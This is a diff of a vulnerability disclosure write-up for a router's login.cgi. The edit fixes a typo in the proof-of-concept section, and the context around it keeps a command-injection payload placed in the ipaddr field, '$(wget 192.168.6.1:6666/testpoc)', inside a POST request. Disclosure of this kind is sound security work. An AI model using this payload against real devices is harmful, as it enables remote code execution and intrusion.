@@ -30,7 +30,7 @@ the value of the `ipaddr` is inserted into `v10` ,and the value of `v10` will be
 
 ## Proof of Concept (PoC)
 
-We set `ippaddr` as **%3A%3Affff%3A192.168.6.1$(wget 192.168.6.1:6666/testpoc)** , and the router will excute it,such as:
+We set `ippaddr` as **%3A%3Affff%3A192.168.6.1$(wget 192.168.6.1:6666/testpoc)** , and the router will execute it,such as:
 
 ```http
 POST /cgi-bin/login.cgi HTTP/1.1
@@ -51,4 +51,5 @@ newUI=1&page=login&username=admin&langChange=0&ipaddr=%3A%3Affff%3A192.168.6.1$(
 ```
 
 <div  align="center"><img src="./img/poc.png" style="zoom:80%;" /></div>
+
 
